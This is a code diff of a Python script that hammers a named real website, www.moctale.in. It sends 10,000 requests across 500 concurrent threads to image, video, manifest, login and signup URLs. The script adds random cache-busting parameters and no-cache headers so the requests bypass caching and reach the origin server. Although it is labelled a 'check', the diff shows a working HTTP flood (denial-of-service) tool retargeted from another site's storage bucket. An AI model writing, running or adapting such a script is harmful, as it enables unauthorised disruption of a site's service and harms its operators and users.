@@ -5,36 +5,61 @@ import concurrent.futures
 import time
 
 image_urls = [
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Dhandoraa+Poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Geethanjali+Malli+Vachindi+Poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Gam+Gam+Ganesha+Poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Harom+Hara+poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Tamil/Movie+pics/Jailer+2+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/English+/Movie+Poster/The+Batman+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/English+/Movie+Poster/Crime101+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Hindi/Movie+pics/Dhurandhar2+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/English+/Movie+Poster/KPop+Demon+Hunters+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Mana+Shankara+Vara+Prasad+Garu+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/English+/Movie+Poster/Passenger.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Pottel+Poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Malyalam/Actor+Pics/Prithviraj+Sukumaran+Poster.png",
-    "https://knitt.s3.us-east-2.amazonaws.com/Tamil/Movie+pics/Seyon+Poster.jpeg",
-    "https://knitt.s3.us-east-2.amazonaws.com/Telugu/Movie+pics/Srikakulam+Sherlock+Holmes+poster.jpg",
-    "https://knitt.s3.us-east-2.amazonaws.com/English+/Movie+Poster/28+Years+Later-+The+Bone+Temple+Poster.jpeg"
+    "https://www.moctale.in/media/PC/PC1.jpg",
+    "https://www.moctale.in/media/PC/PC2.jpg",
+    "https://www.moctale.in/media/PC/PC3.jpg",
+    "https://www.moctale.in/media/PC/PC4.jpg",
+    "https://www.moctale.in/media/PC/PC5.jpg",
+    "https://www.moctale.in/media/PC/PC6.jpg",
+    "https://www.moctale.in/media/PC/PC7.jpg",
+    "https://www.moctale.in/media/PC/PC8.jpg",
+    "https://www.moctale.in/media/PC/PC9.jpg",
+    "https://www.moctale.in/media/PC/PC10.jpg",
+    "https://www.moctale.in/media/PC/PC11.jpg",
+    "https://www.moctale.in/media/PC/PC12.jpg",
+    "https://www.moctale.in/media/PC/PC13.jpg",
+    "https://www.moctale.in/media/PC/PC14.jpg",
+    "https://www.moctale.in/media/PC/PC15.jpg",
+    "https://www.moctale.in/media/PC/PC16.jpg",
+    "https://www.moctale.in/media/PC/PC17.jpg",
+    "https://www.moctale.in/media/PC/PC18.jpg",
+    "https://www.moctale.in/media/PC/PC19.jpg",
+    "https://www.moctale.in/media/PC/PC20.jpg",
+    "https://www.moctale.in/media/PC/PC21.jpg",
+    "https://www.moctale.in/media/PC/PC22.jpg",
+    "https://www.moctale.in/media/PC/PC23.jpg",
+    "https://www.moctale.in/media/PC/PC24.jpg",
+    "https://www.moctale.in/media/PC/PC25.jpg",
+    "https://www.moctale.in/media/PC/PC26.jpg",
+    "https://www.moctale.in/media/PC/PC27.jpg",
+    "https://www.moctale.in/media/PC/PC28.jpg",
+    "https://www.moctale.in/media/PC/PC29.jpg",
+    "https://www.moctale.in/media/PC/PC30.jpg",
+    "https://www.moctale.in/media/screen-recordings/1.mp4",
+    "https://www.moctale.in/media/screen-recordings/2.mp4",
+    "https://www.moctale.in/media/screen-recordings/3.mp4",
+    "https://www.moctale.in/media/screen-recordings/4.mp4",
+    "https://www.moctale.in/manifest.json",
+    "https://www.moctale.in/media/PC/ComicVerse.jpg",
+    "https://www.moctale.in/media/PC/BnFTV.jpg",
+    "https://www.moctale.in/media/PC/PJExplained.jpg",
+    "https://www.moctale.in/login?_rsc=p37cr",
+    "https://www.moctale.in/signup?_rsc=1r34m",
+    "https://www.moctale.in/signup?_rsc=p37cr",
 ]
 headers = {
-    "Host" : "knitt.s3.us-east-2.amazonaws.com",
-    "Accept-Encoding" : "gzip, deflate, br",
-    "Priority":"u=0, i",
+    "Host": "www.moctale.in",
+    "Accept": "*/*",
     "Cache-Control": "no-cache, no-store, must-revalidate",
     "pragma": "no-cache",
-    "referer": "https://www.knitt.app/",
+    "referer": "https://www.moctale.in/",
     "sec-fetch-dest": "image",
     "sec-fetch-mode": "no-cors",
-    "sec-fetch-site": "cross-site",
+    "sec-fetch-site": "same-site",
     "Connection": "close",
     "Expires": "0",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+    "Priority": "u=0, i"
 }
 def fetch_url(request_id):
     target_url = random.choice(image_urls)
@@ -44,13 +69,13 @@ def fetch_url(request_id):
         "_": cache_bust_value
         }
         response = requests.get(target_url, headers=headers,params=params)
-        return f"[{request_id}] Status: {response.status_code}"
+        return f"[{request_id}] Status: {response.status_code} | URL: {target_url}"
 
     except requests.exceptions.RequestException as e:
         return f"[{request_id}] Error for {target_url}: {e}"
 def run_multithreaded_check():
-    total_requests = 20000
-    max_workers = 299
+    total_requests = 10000
+    max_workers = 500
 
     print(f"Starting execution: {total_requests} requests with up to {max_workers} concurrent threads...")
     start_time = time.time()
@@ -66,4 +91,5 @@ def run_multithreaded_check():
 
 if __name__ == "__main__":
     run_multithreaded_check()
+
 
